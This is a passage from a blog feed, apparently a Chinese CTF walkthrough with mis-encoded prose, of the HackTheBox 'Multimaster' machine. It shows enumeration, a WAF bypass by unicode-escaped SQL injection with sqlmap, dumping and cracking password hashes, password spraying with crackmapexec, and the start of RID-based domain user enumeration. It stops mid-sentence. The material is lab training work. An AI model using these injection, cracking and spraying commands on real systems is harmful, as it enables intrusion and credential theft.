options</code>æŸ¥çœ‹å¿…è¦å‚æ•°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104306826-932568411.png" alt="image-20241001104300043"></p><p>å°†å¿…è¦å‚æ•°è®¾ç½®å¥½</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104536892-1525270064.png" alt="image-20241001104529924"></p><p><code>run</code>å¯åŠ¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104701130-877158465.png" alt="image-20241001104654139"></p><p>å‘ç°ç›´æ¥å°±æ˜¯<code>root</code>æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001105113891-316756031.png" alt="image-20241001105107234"></p><p>æœ€ç»ˆåœ¨<code>/home</code>ç›®å½•ä¸‹æ‰¾åˆ°flag</p>]]></content>
    
    
    <summary type="html">TryHackMeç³»åˆ—ä¹‹Bolt</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Multimaster</title>
    <link href="https://www.fomal.cc/posts/aa5df2c0.html"/>
    <id>https://www.fomal.cc/posts/aa5df2c0.html</id>
    <published>2024-07-23T06:31:07.000Z</published>
    <updated>2024-10-06T08:25:29.480Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.179</p><p>æ”»å‡»æœºipï¼š10.10.14.3</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>MSSQLæ³¨å…¥</li><li>MSSQLæ³¨å…¥æšä¸¾åŸŸç”¨æˆ·</li><li>CVE-2019-1414</li><li>æ»¥ç”¨GenericWriteæƒé™æ¨ªå‘ç§»åŠ¨</li><li>æ»¥ç”¨Server Operatorsç»„æƒé™å®ç°æƒé™æå‡</li><li>SeBackupPrivilegeå’ŒSeRestorePrivilegeæƒé™çš„æ»¥ç”¨</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.179</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST</span><br><span class="line">Nmap scan report for 10.10.10.179</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: 403 - Forbidden: Access is denied.</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-07-23T07:24:51+00:00; +7m01s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Domain_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Computer_Name: MULTIMASTER</span><br><span class="line">|   DNS_Domain_Name: MEGACORP.LOCAL</span><br><span class="line">|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|   DNS_Tree_Name: MEGACORP.LOCAL</span><br><span class="line">|   Product_Version: 10.0.14393</span><br><span class="line">|_  System_Time: 2024-07-23T07:24:12+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">| Not valid before: 2024-07-22T07:10:19</span><br><span class="line">|_Not valid after:  2025-01-21T07:10:19</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49783/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: MULTIMASTER</span><br><span class="line">|   NetBIOS computer name: MULTIMASTER\x00</span><br><span class="line">|   Domain name: MEGACORP.LOCAL</span><br><span class="line">|   Forest name: MEGACORP.LOCAL</span><br><span class="line">|   FQDN: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|_  System time: 2024-07-23T00:24:13-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">|_clock-skew: mean: 1h31m00s, deviation: 3h07m51s, median: 7m00s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-23T07:24:16</span><br><span class="line">|_  start_date: 2024-07-23T07:10:28</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.27 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰<code>DNS</code>æœåŠ¡ã€åœ¨<code>80</code>ç«¯å£æœ‰<code>http</code>æœåŠ¡ã€<code>Kerberos</code>æœåŠ¡ã€<code>rpc</code>æœåŠ¡ã€<code>smb</code>æœåŠ¡ã€<code>ldap</code>æœåŠ¡ä»¥åŠ<code>3389</code>ç«¯å£çš„<code>rdp</code>æœåŠ¡ï¼Œæ‰¾åˆ°åŸŸåä¸º<code>MEGACORP.LOCAL</code>ï¼Œä¸”ä¸»æœºä¸º<code>Windows Server 2016</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -N -L //10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153459937-1324338121.png" alt="image-20240723153457969"></p><p>æ²¡ä»€ä¹ˆä¿¡æ¯</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153807990-1882477100.png" alt="image-20240723153806072"></p><p><code>rpc</code>ä¸å…è®¸åŒ¿åè®¿é—®</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -H ldap://10.10.10.179:389 -x -b &quot;DC=MEGACORP,DC=LOCAL&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154220389-36524757.png" alt="image-20240723154218048"></p><p><code>ldap</code>ä¹Ÿå¤±è´¥äº†ï¼Œå¯èƒ½æ˜¯èº«ä»½éªŒè¯å‡ºç°äº†é—®é¢˜</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>åœ¨<code>80</code> ç«¯å£è¿è¡Œç€ä¸€ä¸ª<code>web</code>æœåŠ¡</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154341955-174699650.png" alt="image-20240723154339541"></p><p>æµ‹è¯•åå‘ç°å‡ ä¹éƒ½ç‚¹ä¸äº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723155009137-1563602452.png" alt="image-20240723155006560"></p><p>åœ¨ä¾§è¾¹æ ç‚¹å‡»<code>Colleague Finder</code>åï¼Œä¼šæœ‰ä¸€ä¸ªæœç´¢æ¡†ï¼Œä»€ä¹ˆæ•°æ®éƒ½ä¸è¾“ç‚¹å‡»å›è½¦ä¼šæ˜¾ç¤ºä¸€äº›äººåç­‰ä¿¡æ¯ï¼Œä»…æ­¤è€Œå·²</p><p>å°†ç”¨æˆ·ä¿å­˜ä¸‹æ¥ï¼Œå¯èƒ½åé¢èƒ½ç”¨åˆ°</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer@megacorp.htb</span><br><span class="line">okent@megacorp.htb</span><br><span class="line">ckane@megacorp.htb</span><br><span class="line">kpage@megacorp.htb</span><br><span class="line">shayna@megacorp.htb</span><br><span class="line">james@megacorp.htb</span><br><span class="line">cyork@megacorp.htb</span><br><span class="line">rmartin@megacorp.htb</span><br><span class="line">zac@magacorp.htb</span><br><span class="line">jorden@megacorp.htb</span><br><span class="line">alyx@megacorp.htb</span><br><span class="line">ilee@megacorp.htb</span><br><span class="line">nbourne@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">minato@megacorp.htb</span><br><span class="line">egre55@megacorp.htb</span><br></pre></td></tr></table></figure><p>åœ¨å°è¯•æ‹¿<code>gobuster</code>æ‰«æä¸€ä¸‹ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å…¶ä»–ä¿¡æ¯</p><p><code>gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723164047789-118911268.png" alt="image-20240723164045428"></p><p>ç»“æœå‘ç°æœ‰å·¨å¤šçš„403ï¼Œä¸å¤ªç¬¦åˆæ­£å¸¸æƒ…å†µï¼ŒçŒœæµ‹æœ‰wafå­˜åœ¨</p><p>è¿™ç§æœç´¢ç­‰åŠŸèƒ½å¯èƒ½ä¼šå­˜åœ¨<code>sql</code>æ³¨å…¥ä¹‹ç±»çš„æ´ï¼Œæ‹¿<code>burpsuit</code>æŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723161658318-1989998677.png" alt="image-20240723161655843"></p><p>å‚æ•°ä¸º<code>&#39;</code>è¯•è¯•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723185010410-55567549.png" alt="image-20240723185008069"></p><p>å‘ç°ä¼šæŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨è¿‡æ»¤ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆ<code>waf</code>ä¿¡æ¯ï¼Œå°è¯•<code>fuzz</code>ä¸€ä¸‹</p><p><code>wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d &#39;&#123;&quot;name&quot;:&quot;FUZZ&quot;&#125;&#39; -H &#39;Content-Type: application/json;charset=utf-8&#39; -t 1 --hc 200</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723200250049-1678420648.png" alt="image-20240723200247938"></p><p>å‘ç°è¿”å›åŒ…ä¸­è®¾ç½®çš„å­—ç¬¦ç¼–ç æ˜¯<code>utf-8</code>ï¼Œå°è¯•ä¸€ä¸‹å…¶ä»–ç¼–ç èƒ½å¦ç»•è¿‡</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723201457071-400479735.png" alt="image-20240723201454802"></p><p>æµ‹è¯•åå‘ç°å°†<code>&#39;</code>æŒ‰ç…§<code>unicode</code>ç¼–ç åå‘ç°å¯ä»¥æ­£å¸¸æŸ¥è¯¢ã€‚ç»•è¿‡æˆåŠŸ</p><h1 id="MSSQLæ³¨å…¥"><a href="#MSSQLæ³¨å…¥" class="headerlink" title="MSSQLæ³¨å…¥"></a>MSSQLæ³¨å…¥</h1><h2 id="sqlmapè·å–æ•°æ®"><a href="#sqlmapè·å–æ•°æ®" class="headerlink" title="sqlmapè·å–æ•°æ®"></a>sqlmapè·å–æ•°æ®</h2><p>é€šè¿‡<code>unicode</code>ç¼–ç å¯ä»¥ç»•è¿‡<code>waf</code>ï¼Œå°±èƒ½æ­£å¸¸æ³¨å…¥äº†ï¼Œè¿™é‡Œç›´æ¥æ‹¿<code>sqlmap</code>è·‘ä¸€ä¸‹</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch</code></p><blockquote><p><code>--tamper=charunicodeescape</code>ï¼šå°†payloadä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œunicodeç¼–ç </p><p><code>--delay 5</code>ï¼š å»¶è¿Ÿæ—¶é—´ä¸º5sï¼Œé¿å…è¯·æ±‚æ¬¡æ•°å¤ªå¿«è¢«ban</p><p><code>--level 5 --risk 3</code>ï¼šä½¿ç”¨æ›´å…¨é¢æ›´å¤æ‚çš„payload</p><p><code>--batch</code>ï¼šè‡ªåŠ¨æ¥å—æ‰€æœ‰æç¤º</p></blockquote><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724141638815-1142390614.png" alt="image-20240724141634076"></p><p>ä»ä¸Šè¿°ç»“æœä¸­å¯ä»¥å‘ç°ï¼Œè¯¥æ•°æ®åº“æ˜¯<code>SQL Server</code>å¹¶ä¸”<code>sqlmap</code>æˆåŠŸæ‰§è¡Œï¼Œç»§ç»­æ‰¾æ•°æ®åº“å</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -dbs</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724142014523-1333297535.png" alt="image-20240724142006540"></p><p>å…ˆæŸ¥çœ‹<code>Hub_DB</code>æ•°æ®åº“çœ‹çœ‹æœ‰å“ªäº›è¡¨</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -tables</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143527309-1226900171.png" alt="image-20240724143522636"></p><p>æœ‰ä¸¤ä¸ªè¡¨ï¼Œç›´æ¥æŸ¥çœ‹ä¸€ä¸‹è¡¨ä¸­çš„å€¼</p><ul><li><code>Colleagues</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Colleagues --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143758776-409341571.png" alt="image-20240724143754224"></p><p>è¿™æ˜¯ä¸€å¼ åŒäº‹è¡¨ï¼Œå­˜å‚¨ç€æ¯ä¸ªäººçš„ä¿¡æ¯</p><ul><li><code>Logins</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Logins --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724144019780-335466335.png" alt="image-20240724144015197"></p><p>å‘ç°æ˜¯æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨</p><ul><li><code>users</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">shayna</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">minatotw</span><br><span class="line">egre55</span><br></pre></td></tr></table></figure><ul><li><code>passwords</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å‘ç°å¤§å¤šæ•°å¯†ç éƒ½æ˜¯ä¸€æ ·çš„</p><h2 id="hashcatç ´è§£å¯†ç "><a href="#hashcatç ´è§£å¯†ç " class="headerlink" title="hashcatç ´è§£å¯†ç "></a>hashcatç ´è§£å¯†ç </h2><p>å…ˆåˆ©ç”¨<code>john</code>å°è¯•ç ´è§£å¯†ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154238265-1306385108.png" alt="image-20240724154233559"></p><p>å‘ç°å¹¶æ²¡æœ‰æˆåŠŸï¼Œå°è¯•ä½¿ç”¨<code>hash-identifier</code>æŸ¥çœ‹æ•°æ®ç±»å‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154552885-955828641.png" alt="image-20240724154548438"></p><p>å‘ç°é•¿åº¦ä¸º384ï¼Œæµ‹è¯•åå‘ç°æ˜¯<code>Keccak-384</code></p><p><code>hashcat -m 17900 passwords /usr/share/wordlists/rockyou.txt --force</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154759021-1055109536.png" alt="image-20240724154754519"></p><p>æœ€åä¹Ÿæ˜¯æˆåŠŸç ´è§£å‡ºä¸‰ä¸ªå¯†ç ï¼Œè™½ç„¶æ•°æ®åº“ä¸­æœ‰ä¸€å †ç”¨æˆ·ï¼Œä½†æ˜¯åªæœ‰å››ä¸ªå”¯ä¸€çš„å¯†ç æ‰¾åˆ°ä¸å…¶å¯¹åº”çš„ç”¨æˆ·å</p><div class="table-container"><table><thead><tr><th>ç”¨æˆ·å</th><th>å¯†ç </th></tr></thead><tbody><tr><td>sbauer, shayna, james, cyork, jorden, aldom</td><td>password1</td></tr><tr><td>ckane, kpage, zac, ilee, zpowers</td><td>finance1</td></tr><tr><td>okent, rmartin, alyx, nbourne</td><td>banking1</td></tr><tr><td>minatotw, egre55</td><td>æœªçŸ¥</td></tr></tbody></table></div><p>å‘ç°ä¸çŸ¥é“å¯†ç çš„ä¸¤ä¸ªäººèº«ä»½æ˜¯<code>CEO</code>ï¼Œå°†å¯†ç é‡æ–°ä¿å­˜è‡³æ–°çš„æ–‡ä»¶<code>passwds</code></p><h2 id="å¯†ç å–·æ´’"><a href="#å¯†ç å–·æ´’" class="headerlink" title="å¯†ç å–·æ´’"></a>å¯†ç å–·æ´’</h2><p>å°†æå–å‡ºæ¥çš„å¯†ç ä¿å­˜ä¸‹æ¥ï¼Œå°è¯•ä½¿ç”¨<code>crackmapexec</code>è¿›è¡Œå¯†ç å–·æ´’</p><p><code>crackmapexec smb 10.10.10.179 -u users -p passwords</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724161246263-1891197988.png" alt="image-20240724161241655"></p><p>éƒ½å¤±è´¥äº†ï¼Œåªèƒ½å¯»æ‰¾å…¶ä»–åŠæ³•äº†ï¼Œå°è¯•å¯»æ‰¾å…¶ä»–æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œç„¶è€Œè¿™äº›æ•°æ®åº“ä¸­æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯</p><h1 id="MSSQL-æ³¨å…¥æšä¸¾åŸŸç”¨æˆ·å"><a href="#MSSQL-æ³¨å…¥æšä¸¾åŸŸç”¨æˆ·å" class="headerlink" title="MSSQL æ³¨å…¥æšä¸¾åŸŸç”¨æˆ·å"></a>MSSQL æ³¨å…¥æšä¸¾åŸŸç”¨æˆ·å</h1><h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><blockquote><p>é€šè¿‡ç½‘ä¸Šæœç´¢å‘ç°å¯ä»¥ä½¿ç”¨ RID è›®åŠ›é€šè¿‡ MSSQL æ³¨å…¥æ¥æ‰§è¡ŒActive Directoryæšä¸¾è·å–ç”¨æˆ·å</p><p>æ”»å‡»åŸç†ï¼š</p><ul><li>æ‰¾å‡ºåŸŸå</li><li>æ‰¾å‡ºåŸŸçš„SID</li><li>é€šè¿‡è¿­ä»£ä¸€ç³»åˆ— RID æ¥ç¡®å®šæ¯ä¸ªå¯¹è±¡çš„åç§°ï¼Œä»è€Œæ„å»ºç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœº SID</li></ul><p><a href="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html">å‚è€ƒé“¾æ¥</a></p><p>SQL Serverä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«åšSUSER_SID()å¯ä»¥ç”¨æ¥ï¼Œå®ƒå¯ä»¥è¿”å›ç»™å®šç”¨æˆ·çš„å®‰å…¨æ ‡è¯†å·ï¼ˆSIDï¼‰ï¼Œä½¿ç”¨å®ƒæ¥æ ‡è¯†ä¸»åŸŸç®¡ç†å‘˜çš„SIDã€‚</p><p>åˆ©ç”¨SQLæ³¨å…¥æšä¸¾åŸŸå†…ç”¨æˆ·ä¸»è¦ç”¨åˆ°ä¸¤ä¸ªå‡½æ•°æ˜¯SUSER_SIDå’ŒSUSER_SNAME</p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16">SUSER_SID()å‡½æ•°è¯´æ˜</a></p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16">SUSER_SNAME()å‡½æ•°è¯´æ˜</a></p><p>å…ˆä½¿ç”¨SUSER_SIDå‡½æ•°æ‹¿åˆ°åŸŸçš„SIDï¼Œä¹‹åä½¿ç”¨SUSER_SNAMEå‡½æ•°é€šè¿‡ä¹‹å‰æ‹¿åˆ°çš„SIDè¿›è¡Œæ‹¼æ¥RIDè¿›è¡Œæšä¸¾åŸŸç”¨æˆ·åï¼Œä¹‹ååœ¨é€šè¿‡æ‹¿åˆ°çš„åŸŸç”¨æˆ·åå–·æ´’ä¹‹å‰è·å¾—çš„å‡­æ®å¯†ç ã€‚</p></blockquote><p>ä»ä¹‹å‰<code>sqlmap</code>è·å–æ•°æ®éƒ¨åˆ†å¯ä»¥çŸ¥é“ï¼Œå­—æ®µæ•°ä¸º5ï¼Œå›æ˜¾ä½ç½®æ˜¯4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182312718-55166275.png" alt="image-20240724182307833"></p><p>è¿™é‡Œå€ŸåŠ©<code>CyberChef</code>å·¥å…·çš„<code>Escape Unicode Characters</code>æ¨¡å—ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¸®åŠ©æˆ‘ä»¬è¿›è¡Œç¼–ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724183224966-434528211.png" alt="image-20240724183219833"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182733745-1169710557.png" alt="image-20240724182729157"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå°†<code>sqlmap</code>è·‘å‡ºæ¥çš„<code>Payload</code>ç»è¿‡<code>unicode</code>ç¼–ç 